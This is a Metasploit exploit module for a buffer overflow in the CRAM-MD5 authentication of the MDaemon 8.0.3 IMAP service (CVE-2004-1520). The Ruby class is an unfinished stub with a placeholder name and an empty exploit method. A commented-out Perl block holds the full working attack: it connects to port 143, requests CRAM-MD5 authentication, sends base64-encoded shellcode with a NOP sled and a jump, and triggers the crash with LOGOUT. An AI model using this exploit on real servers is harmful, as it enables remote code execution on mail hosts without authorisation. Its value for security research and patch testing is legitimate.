require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Mdaemon 8.0.3 IMAPD CRAM-MD5 Authentication Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in the CRAM-MD5
				authentication of the MDaemon IMAP service. This
				vulnerability was discovered by Muts.
					
			},
			'Author'         => [ 'anonymous' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '11838'],
					[ 'CVE', '2004-1520'],
					[ 'BID', '11675'],
					[ 'MIL', '90'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x1f\xff\xff\xff\x44",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Nov 12 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mdaemon_imap_cram_md5;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = { };

my $info = {
	'Name'    => 'Mdaemon 8.0.3 IMAPD CRAM-MD5 Authentication Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'anonymous' ],

	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32'],
	'Priv'    => 1,

	'AutoOpts'  => { 'EXITFUNC'  => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
	  },

	'Payload' =>
	  {
		'Prepend'	=> "\x81\xc4\x1f\xff\xff\xff\x44", # make stack happy
		'Space'     => 500,
		'BadChars'  => "\x00",
	  },

	'Description'  => Pex::Text::Freeform(qq{
    This module exploits a buffer overflow in the CRAM-MD5 authentication of the
    MDaemon IMAP service. This vulnerability was discovered by Muts.
}),

	'Refs'  =>
	  [
		['OSVDB', '11838'],
		['CVE',   '2004-1520'],
		['BID',   '11675'],
		['MIL',   '90'],
	  ],

	'Targets' =>
	  [
		['MDaemon IMAP 8.0.3 Windows XP SP2'],
	  ],

	'Keys' => ['mdaemon'],

	'DisclosureDate' => 'Nov 12 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );

	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] Got Banner: ' . $resp);

	my $req = "a001 authenticate cram-md5\r\n";
	$sock->Send($req);
	$self->PrintLine('[*] CRAM-MD5 authentication method asked');

	$resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] Got CRAM-MD5 answer: ' . $resp);

	# Magic no return-address exploitation ninjaness!
	$req = "AAAA" . $shellcode . $self->MakeNops(258) . "\xe9\x05\xfd\xff\xff";
	$req = Pex::Text::Base64Encode($req, '') . "\r\n";
	$sock->Send($req);
	$self->PrintLine('[*] CRAM-MD5 authentication with shellcode sent');

	$resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] Got authentication reply: ' . $resp);

	$req = "a002 LOGOUT\r\n";
	$sock->Send($req);
	$self->PrintLine('[*] Send LOGOUT to close the thread and trigger an exception');

	$resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] Got LOGOUT reply: ' . $resp);

	$self->PrintLine("[*] Overflow request sent, sleeping for one second");
	select(undef, undef, undef, 1);

	$self->Handler($sock);
	return;
}

1;

=end


end
end	
